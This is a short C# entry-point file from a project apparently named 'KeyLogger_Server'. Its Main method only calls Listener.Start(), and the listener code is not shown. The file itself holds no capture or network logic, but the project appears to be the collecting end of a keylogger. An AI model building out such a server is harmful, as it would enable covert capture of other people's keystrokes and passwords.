using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger_Server
{
    class Program
    {
        public static void Main(string[] args)
        {
            Listener.Start();
        }

        
    }
}
